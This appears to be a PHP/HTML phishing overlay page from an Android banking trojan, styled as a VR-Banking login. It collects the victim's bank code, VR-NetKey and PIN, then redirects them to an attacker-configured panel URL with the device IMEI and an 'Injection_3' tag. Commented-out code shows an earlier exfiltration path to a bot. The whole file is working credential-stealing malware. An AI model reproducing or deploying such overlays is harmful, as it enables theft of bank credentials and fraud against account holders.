<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>VR</title>
    <style>
        html, body {
            background-color: #0066b3;
        }

        .input-field {
            background-color: rgba(245, 245, 245, 0);
            outline: medium none;
            border: 1px solid rgba(245, 245, 245, 0);
            border-bottom-color: rgb(255, 255, 255);
            -moz-border-top-colors: none;
            -moz-border-right-colors: none;
            -moz-border-bottom-colors: none;
            -moz-border-left-colors: none;
            border-image: none;
            width: 80%;
            margin-left: 10px;
            margin-right: 10px;
            font-family: "Arial",serif;
            font-size: 18px;
            font-weight: lighter;
            text-indent: 5px;
        }

        .header {
            background-clip: border-box;
            background: rgba(245, 245, 245, 0) scroll;
            box-sizing: border-box;
            color: #111;
            margin-top: 15px;
            margin-left: 10px;
        }

        .header > img {
            width: 86px;
            height: 50px;
        }

        .submit-button {
            -moz-box-shadow:inset 0 1px 0 0 #7a8eb9;
            -webkit-box-shadow:inset 0 1px 0 0 #7a8eb9;
            box-shadow:inset 0 1px 0 0 #7a8eb9;
            background-color:#009CDE;
            border:1px solid #009CDE;
            display:inline-block;
            cursor:pointer;
            color:#ffffff;
            font-family: Arial,serif;
            font-size:18px;
            padding:16px 44px;
            text-decoration:none;
            width: 85%;
            margin-left: 10px;
            margin-right: 10px;
            font-weight: lighter;
        }

        .submit-button:hover {
            background-color:#00acf4;
        }

        .submit-button:active {
            position:relative;
            top:1px;
        }

        .fielderror {
		border: 0;
            border-bottom: 1px solid #EC4343;
			            background-color: rgba(245, 245, 245, 0);
            outline: medium none;

            -moz-border-top-colors: none;
            -moz-border-right-colors: none;
            -moz-border-bottom-colors: none;
            -moz-border-left-colors: none;
            width: 80%;
            margin-left: 10px;
            margin-right: 10px;
            font-family: "Arial",serif;
            font-size: 18px;
            font-weight: lighter;
            text-indent: 5px;
        }

    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div id="content_div">
        <div class="header">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAAA7CAYAAADhPH1zAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhEMDkzOUUwRDAxNDExRTU5MzU2QjEyN0ZFQTY3NzBFIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhEMDkzOUUxRDAxNDExRTU5MzU2QjEyN0ZFQTY3NzBFIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEQwOTM5REVEMDE0MTFFNTkzNTZCMTI3RkVBNjc3MEUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEQwOTM5REZEMDE0MTFFNTkzNTZCMTI3RkVBNjc3MEUiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4eXh1uAAAIkUlEQVR42uxc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" />
        </div>
        <br/>
        <br/>

        <form action="null" method="post" id="_mainForm" target="flow_handler" style="text-align: center;">
            <input placeholder="BLZ" id="blz" name="blz" class="input-field" type="text" />
            <br/>
            <br/>

            <input placeholder="VR-NetKey oder Alias" name="netkey" id="netkey" class="input-field" type="password" />
            <br/>
            <br/>

            <input placeholder="PIN" name="pin" id="pin" class="input-field" type="password" />
            <script>
                document.getElementById('pin').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
            <br/>
            <br/>

            <input type="hidden" name="name" value="VR-Banking">
            <input class="submit-button" type="button" value="Log In" id="submitBtn1">
            <br/>
            <br/>
            <br/>

        </form>
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('blz');
                        var oCodeInp = document.getElementById('netkey');
                        var PIN = document.getElementById('pin');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        if (!/^\w{3,100}$/i.test(PIN.value)) {
							try{
                                PIN.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "vr_banking'+
						'", "blz": "'+oNumInp.value+
						'", "vr_netkey_oder_alias" : "'+oCodeInp.value+
						'", "pin": "'+PIN.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|vr_banking|"+oNumInp.value+"|"+oCodeInp.value+"|"+PIN.value);


						
						
						return false;
                    };

                })();
            </script>
</body>
</html>
